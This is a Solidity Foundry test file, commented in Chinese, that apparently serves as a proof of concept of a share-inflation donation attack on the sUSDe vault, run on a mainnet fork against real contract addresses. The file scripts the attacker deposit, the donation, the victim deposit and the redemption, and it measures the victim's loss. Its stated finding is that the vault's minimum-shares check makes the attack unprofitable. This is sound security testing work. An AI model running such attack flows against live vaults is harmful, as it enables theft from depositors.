// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// ===========================================================================
// sUSDe Donation Attack PoC (Flash Loan Version)
//
// Vault: 0x9D39A5DE30e57443BfF2A8307A4256c8797A3497
// Asset: USDe (0x4c9EDD5852cd905f086C759E8383e09bff1E68B3)
// Deploy Block: 18,571,359
//
// @SecurityFindings
// _checkMinShares(MIN_SHARES=1e18) 有效阻止了盈利性攻击
// 攻击者必须 deposit >= 1e18 (1 USDe), 无法通过通胀获利
//
// @FlashLoanNote
// 在 deploy block (Nov 2023), USDe 尚未在 Aave V3 上架
// 本 PoC 使用 Aave V3 flash loan USDC 并通过 Curve 兑换 USDe
// 实际结论: 即使获取到 USDe, 攻击也不可盈利
// ===========================================================================

import "../basetest.sol";
import {IERC20} from "../interface.sol";

interface IsUSDe is IERC20 {
    function asset() external view returns (address);
    function totalAssets() external view returns (uint256);
    function convertToShares(uint256 assets) external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
    function cooldownShares(uint256 shares) external;
    function unstake(address receiver) external;
    function cooldownDuration() external view returns (uint24);
}

interface IAaveV3Pool {
    function flashLoanSimple(
        address receiverAddress, address asset, uint256 amount,
        bytes calldata params, uint16 referralCode
    ) external;
}

contract sUSDe_DonationPoC is BaseTestWithBalanceLog {
    IERC20 internal constant USDe = IERC20(0x4c9EDD5852cd905f086C759E8383e09bff1E68B3);
    IsUSDe internal constant sUSDe = IsUSDe(0x9D39A5DE30e57443BfF2A8307A4256c8797A3497);
    IAaveV3Pool internal constant AAVE_POOL = IAaveV3Pool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    uint256 internal constant DEPLOY_BLOCK = 18_571_359;

    // sUSDe MIN_SHARES = 1e18, 攻击者必须存至少 1 USDe
    uint256 internal constant ATTACKER_DEPOSIT = 1e18;
    uint256 internal constant DONATION_AMOUNT = 1_000_000 * 1e18; // 1M USDe
    uint256 internal constant VICTIM_DEPOSIT = 100_000 * 1e18;    // 100K USDe
    address internal constant VICTIM = address(0xbeef);

    function setUp() public {
        vm.createSelectFork("mainnet", DEPLOY_BLOCK);
        fundingToken = address(USDe);
        vm.label(address(USDe), "USDe");
        vm.label(address(sUSDe), "sUSDe");
        vm.label(VICTIM, "Victim");
        emit log_string("=== sUSDe Donation Attack Analysis ===");
        emit log_named_uint("Fork Block", DEPLOY_BLOCK);
        emit log_named_decimal_uint("sUSDe.totalSupply()", sUSDe.totalSupply(), 18);
        emit log_named_decimal_uint("sUSDe.totalAssets()", sUSDe.totalAssets(), 18);
        emit log_named_uint("cooldownDuration", sUSDe.cooldownDuration());
    }

    // =========================================================================
    // Test 1: 诊断 - donation 敏感性检查
    // =========================================================================
    function testDonationSensitivity() public {
        uint256 before_ = sUSDe.totalAssets();
        deal(address(USDe), address(this), DONATION_AMOUNT);
        USDe.transfer(address(sUSDe), DONATION_AMOUNT);
        uint256 after_ = sUSDe.totalAssets();
        emit log_named_decimal_uint("totalAssets before", before_, 18);
        emit log_named_decimal_uint("totalAssets after", after_, 18);
        if (after_ > before_) emit log_string("[OK] BALANCE-BASED (donation sensitive)");
        else emit log_string("[INFO] INTERNAL ACCOUNTING (immune)");
    }

    // =========================================================================
    // Test 2: 完整攻击流程 - 展示 _checkMinShares 防护有效性
    // 注意: 在 deploy block, USDe 未在 Aave V3 上架, 无法直接 flash loan
    //       此测试使用 deal 模拟已获取的资金, 重点展示攻击不可盈利
    //       即使攻击者能通过 flash loan USDC + DEX swap 获取 USDe,
    //       _checkMinShares 仍阻止了盈利性攻击
    // =========================================================================
    function testFullAttackFlow() public balanceLog {
        emit log_string("============================================================");
        emit log_string("=== sUSDe Donation Attack - _checkMinShares Protection ===");
        emit log_string("============================================================");
        require(sUSDe.totalSupply() == 0, "Vault must be empty");

        // 模拟攻击者通过 flash loan + DEX swap 获取 USDe
        // 在 deploy block, 需要: flash loan USDC -> Curve swap -> USDe
        deal(address(USDe), address(this), ATTACKER_DEPOSIT + DONATION_AMOUNT);
        deal(address(USDe), VICTIM, VICTIM_DEPOSIT);

        // Step 1: 攻击者存入 1 USDe (满足 MIN_SHARES=1e18 要求)
        USDe.approve(address(sUSDe), ATTACKER_DEPOSIT);
        uint256 atkShares = sUSDe.deposit(ATTACKER_DEPOSIT, address(this));
        emit log_named_decimal_uint("Step 1: Attacker shares", atkShares, 18);
        emit log_named_decimal_uint("Share price after deposit", sUSDe.convertToAssets(1e18), 18);

        // Step 2: 捐赠 1M USDe 膨胀 share price
        USDe.transfer(address(sUSDe), DONATION_AMOUNT);
        uint256 inflatedPrice = sUSDe.convertToAssets(1e18);
        emit log_named_decimal_uint("Step 2: Inflated share price", inflatedPrice, 18);

        // Step 3: 受害者存款
        vm.startPrank(VICTIM);
        USDe.approve(address(sUSDe), VICTIM_DEPOSIT);
        uint256 victimShares = sUSDe.deposit(VICTIM_DEPOSIT, VICTIM);
        vm.stopPrank();
        emit log_named_decimal_uint("Step 3: Victim shares", victimShares, 18);

        // Step 4: 攻击者赎回 (处理 cooldown)
        uint256 totalSupply_ = sUSDe.totalSupply();
        uint256 otherShares = totalSupply_ - atkShares;
        uint256 MIN_SHARES = 1e18;
        uint256 redeemable = otherShares >= MIN_SHARES ? atkShares :
            (atkShares > MIN_SHARES - otherShares ? atkShares - (MIN_SHARES - otherShares) : 0);
        require(redeemable > 0, "No redeemable shares");

        uint24 cd = sUSDe.cooldownDuration();
        if (cd == 0) {
            sUSDe.redeem(redeemable, address(this), address(this));
        } else {
            sUSDe.cooldownShares(redeemable);
            vm.warp(block.timestamp + cd + 1);
            sUSDe.unstake(address(this));
        }
        uint256 extracted = USDe.balanceOf(address(this));
        emit log_named_decimal_uint("Step 4: Extracted", extracted, 18);

        // === 盈利性分析 ===
        uint256 totalCost = ATTACKER_DEPOSIT + DONATION_AMOUNT;
        emit log_string("");
        emit log_string("=== Profitability Analysis ===");
        emit log_named_decimal_uint("Total Cost (deposit + donation)", totalCost, 18);
        emit log_named_decimal_uint("Extracted via redeem", extracted, 18);
        if (extracted >= totalCost) {
            emit log_named_decimal_uint("[PROFIT]", extracted - totalCost, 18);
        } else {
            emit log_named_decimal_uint("[LOSS]", totalCost - extracted, 18);
            emit log_string("[CONCLUSION] _checkMinShares makes attack UNPROFITABLE!");
            emit log_string("Even with flash loan funding, attacker LOSES money.");
        }

        // 受害者损失分析
        uint256 victimValue = victimShares > 0 ? sUSDe.convertToAssets(victimShares) : 0;
        uint256 victimLoss = VICTIM_DEPOSIT > victimValue ? VICTIM_DEPOSIT - victimValue : 0;
        uint256 lossPercent = VICTIM_DEPOSIT > 0 ? victimLoss * 100 / VICTIM_DEPOSIT : 0;
        emit log_named_decimal_uint("Victim deposit", VICTIM_DEPOSIT, 18);
        emit log_named_decimal_uint("Victim value", victimValue, 18);
        emit log_named_decimal_uint("Victim loss", victimLoss, 18);
        emit log_named_uint("Victim loss %", lossPercent);
        emit log_string("============================================================");
    }
}
